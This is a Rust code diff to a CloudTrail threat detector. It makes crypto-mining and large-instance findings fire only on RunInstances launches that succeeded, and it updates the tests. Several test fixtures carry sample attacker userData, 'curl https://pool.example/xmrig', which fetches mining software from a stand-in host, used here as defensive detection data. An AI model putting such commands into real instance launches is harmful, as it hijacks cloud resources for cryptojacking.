@@ -176,7 +176,10 @@ impl CloudTrailDetector {
             ));
         }
 
-        if event_name == "runinstances" && self.run_instances_with_mining_indicators(cloudtrail) {
+        if event_name == "runinstances"
+            && run_instances_succeeded(cloudtrail)
+            && self.run_instances_with_mining_indicators(cloudtrail)
+        {
             findings.push(self.finding(
                 event,
                 cloudtrail,
@@ -195,6 +198,7 @@ impl CloudTrailDetector {
         }
 
         if event_name == "runinstances"
+            && run_instances_succeeded(cloudtrail)
             && let Some(matched) =
                 self.run_instances_large_instance_from_unusual_principal(&principal, cloudtrail)
         {
@@ -445,7 +449,7 @@ impl CloudTrailDetector {
                 .or_default()
                 .insert(normalize(source_ip));
         }
-        if event_name == "runinstances" {
+        if event_name == "runinstances" && run_instances_succeeded(cloudtrail) {
             for instance_type in run_instances_instance_types(cloudtrail) {
                 guard
                     .instance_types_by_principal
@@ -553,6 +557,25 @@ fn principal_key(cloudtrail: &CloudTrailEvent) -> String {
         .map(normalize)
         .filter(|value| !value.is_empty())
         .unwrap_or_else(|| "unknown".to_string())
+}
+
+fn run_instances_succeeded(cloudtrail: &CloudTrailEvent) -> bool {
+    if cloudtrail.error_code.is_some()
+        || cloudtrail
+            .error_message
+            .as_deref()
+            .is_some_and(|value| !value.trim().is_empty())
+    {
+        return false;
+    }
+    // A successful RunInstances response carries `instancesSet/items[]`. AWS
+    // omits or empties it when the launch was rejected (limits, permissions,
+    // capacity), so absence is the strongest available success signal.
+    cloudtrail
+        .response_elements
+        .pointer("/instancesSet/items")
+        .and_then(Value::as_array)
+        .is_some_and(|items| !items.is_empty())
 }
 
 fn console_login_succeeded(cloudtrail: &CloudTrailEvent) -> bool {
@@ -770,10 +793,48 @@ mod tests {
             "instanceType": "c5.large",
             "userData": "curl https://pool.example/xmrig"
         });
+        payload_mut(&mut event).response_elements = json!({
+            "instancesSet": { "items": [{ "instanceId": "i-mine" }] }
+        });
 
         let findings = detector.evaluate(&event);
         assert_eq!(findings.len(), 1);
         assert_eq!(findings[0].threat_class, ThreatClass::Impact);
+    }
+
+    #[test]
+    fn rejected_run_instances_does_not_emit_findings_or_seed_baseline() {
+        let detector = CloudTrailDetector::default();
+        let mut rejected = event(
+            "evt-rejected",
+            "arn:aws:iam::123456789012:user/alice",
+            "RunInstances",
+        );
+        payload_mut(&mut rejected).request_parameters = json!({
+            "imageId": "ami-evilminer",
+            "instanceType": "p4d.24xlarge",
+            "userData": "curl https://pool.example/xmrig"
+        });
+        // No instancesSet/items in responseElements => the launch was rejected.
+        assert!(
+            detector.evaluate(&rejected).is_empty(),
+            "rejected RunInstances must not produce findings"
+        );
+
+        // Subsequent successful launch from the same principal must still be a
+        // first-time large-instance baseline (the rejected request didn't seed it).
+        let mut accepted = event(
+            "evt-accepted",
+            "arn:aws:iam::123456789012:user/alice",
+            "RunInstances",
+        );
+        payload_mut(&mut accepted).request_parameters = json!({
+            "instanceType": "t3.medium"
+        });
+        payload_mut(&mut accepted).response_elements = json!({
+            "instancesSet": { "items": [{ "instanceId": "i-baseline" }] }
+        });
+        assert!(detector.evaluate(&accepted).is_empty());
     }
 
     #[test]
@@ -785,6 +846,9 @@ mod tests {
             "RunInstances",
         );
         payload_mut(&mut baseline).request_parameters = json!({ "instanceType": "t3.medium" });
+        payload_mut(&mut baseline).response_elements = json!({
+            "instancesSet": { "items": [{ "instanceId": "i-baseline" }] }
+        });
         assert!(detector.evaluate(&baseline).is_empty());
 
         let mut second = event(
@@ -793,6 +857,9 @@ mod tests {
             "RunInstances",
         );
         payload_mut(&mut second).request_parameters = json!({ "instanceType": "p4d.24xlarge" });
+        payload_mut(&mut second).response_elements = json!({
+            "instancesSet": { "items": [{ "instanceId": "i-second" }] }
+        });
         let findings = detector.evaluate(&second);
         assert_eq!(findings.len(), 1);
         assert_eq!(
@@ -893,6 +960,9 @@ mod tests {
         payload_mut(&mut baseline).request_parameters = json!({
             "instancesSet": { "items": [{ "instanceType": "t3.small" }] }
         });
+        payload_mut(&mut baseline).response_elements = json!({
+            "instancesSet": { "items": [{ "instanceId": "i-baseline" }] }
+        });
         assert!(detector.evaluate(&baseline).is_empty());
 
         let mut multi = event(
@@ -905,6 +975,14 @@ mod tests {
                 "items": [
                     { "instanceType": "t3.micro" },
                     { "instanceType": "p4d.24xlarge" },
+                ]
+            }
+        });
+        payload_mut(&mut multi).response_elements = json!({
+            "instancesSet": {
+                "items": [
+                    { "instanceId": "i-micro" },
+                    { "instanceId": "i-p4d" },
                 ]
             }
         });
